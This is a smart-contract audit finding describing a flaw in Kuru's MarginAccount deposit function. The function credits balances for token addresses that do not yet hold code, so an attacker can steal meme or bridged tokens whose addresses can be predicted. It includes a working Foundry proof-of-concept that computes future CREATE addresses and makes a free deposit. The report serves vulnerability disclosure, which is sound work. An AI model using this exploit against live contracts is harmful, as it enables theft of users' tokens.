# Anyone can steal meme token and crossbridge token from Margin Account

## Summary

`MarginAccount.sol` accepts all ERC20 token transfers from users through `deposit`

```solidity
    function deposit(address _user, address _token, uint256 _amount) external payable protocolActive {
        require(_user != address(0), MarginAccountErrors.ZeroAddressNotAllowed());
        if (_token == NATIVE) {
            require(msg.value == _amount, MarginAccountErrors.NativeAssetMismatch());
            balances[_accountKey(_user, NATIVE)] += _amount;
        } else {
            require(msg.value == 0, MarginAccountErrors.NativeAssetMismatch());
            balances[_accountKey(_user, _token)] += _amount;
            _token.safeTransferFrom(_msgSender(), address(this), _amount);//@audit H allow deposit non exist token before market exist. Also solady.safeTransfer check zero code size but ignore EOA
        }

        emit Deposit(_user, _token, _amount);
    }
```

If `_token` ERC20 address hasn’t been deployed yet, `_token.safeTransferFrom` relies on Solady `SafeTransferLib` which treats a call to EOA as successful. The `msg.sender` will receive a free deposit balance without transferring any tokens.

An exploiter has two ways to predict pre-deployed addresses for the Kuru project.



First, the Kuru project uses `CREATE` when launching meme tokens.

- <https://docs.kuru.io/kuru-pro/launch>
- `MonadDeployer.deployTokenAndMarket()` launches a new meme token and whitelists that token for trading on the OrderBook and Router.

Second, on the Monad chain, a cross-bridge contract can use `CREATE2` to deploy an ERC-20 at a predictable address.

An exploiter can deposit a token with no contract code before the token is actually deployed—either a meme token via Kuru Deployer or a Monad cross-chain bridge token.
Once real users deposit the actual token for trading, the exploiter can steal tokens from the `MarginAccount` contract.

## Impact

High: free theft of meme tokens from the launchpad. It’s also possible to predict cross-chain bridge token addresses before the token is bridged to Monad.

## POC

This exploit can be replicated by adding the following test to `RouterTest.t.sol`
```solidity

    // Extra import 
    import {MonadDeployer} from "../contracts/periphery/MonadDeployer.sol";
    import {SafeTransferLib} from "solady/src/utils/SafeTransferLib.sol";
    import {IRouter} from "../contracts/interfaces/IRouter.sol";

    // add this to OrderBookTest contract in file test/RouterTest.t.sol
    function testDebug_free_deposit1() public {
        // SafeTransferLib.safeTransferFrom(address(0x123123123), address(0x123), address(0x123), 3e18);
        address exploiter = makeAddr("Exploiter");

        MonadDeployer monadDeployer = new MonadDeployer(
            IRouter(address(router)), address(this), address(marginAccount), address(0x123), 100, 10 * 10 ** 18
        );

        //get a list of possible new contract deployed with monad deployer
        address[] memory computeAddresses1 = new address[](128);
        for (uint8 nonce = 1; nonce <= 128; nonce++) {
            bytes memory data = abi.encodePacked(
                bytes1(0xd6), // list prefix (0xc0 + 22)
                bytes1(0x94), // address prefix (0x80 + 20)
                address(monadDeployer),
                nonce
            );
            computeAddresses1[nonce - 1] = address(uint160(uint256(keccak256(data))));
        }

        address memeTokenAddress = computeAddresses1[0];
        console.log("0:", memeTokenAddress);

        // ATTACK: free deposit token before contract was created
        marginAccount.deposit(exploiter, memeTokenAddress, 1e77);

        {
            //Someone Deploy new market and meme token
            MonadDeployer.TokenParams memory tokenParams = MonadDeployer.TokenParams(
                "CHOG", "CHOG", "https://chog.com/chog.json", 1000000 * 10 ** 18, address(this), 100
            );

            MonadDeployer.MarketParams memory marketParams = MonadDeployer.MarketParams({
                nativeTokenAmount: 100 * 10 ** 18, // 100 native tokens
                sizePrecision: 10 ** 10, // 10^10 for size precision
                pricePrecision: 10 ** 2, // 10^2 for price precision
                tickSize: 10, // 10 tick size
                minSize: 10 ** 2, // 10^2 minimum size
                maxSize: 10 ** 10, // 10^10 maximum size
                takerFeeBps: 10, // 10 basis points taker fee
                makerFeeBps: 5 // 5 basis points maker fee
            });
            //deploy token and market create 2 new contracts.
            address market = monadDeployer.deployTokenAndMarket{value: 110 ether}(tokenParams, marketParams, bytes(""));
        }

        //KuruERC20 CHOG token address
        
        assertEq(
            ERC20(computeAddresses1[0]).totalSupply(),
            1000000 * 10 ** 18,
            "Total supply of CHOG token is not the same as predicted"
        );
        console.log("Meme token supply:", ERC20(memeTokenAddress).totalSupply());
        console.log(
            "Exploiter Balance:", marginAccount.balances(keccak256(abi.encodePacked(exploiter, memeTokenAddress)))
        );

        assertGt(
            marginAccount.balances(keccak256(abi.encodePacked(exploiter, memeTokenAddress))),
            ERC20(memeTokenAddress).totalSupply(),
            "Exploiter balance should be greater than meme token supply"
        );
        // Exploiter gain lots free token deposit. And can now withdraw meme token if anyone ever deposit this token
    }
```

## Recommendations

While trading on Kuru is open access, the official UX/UI still has a whitelist layer.
Consider enforcing a token whitelist in the contract code itself as well.
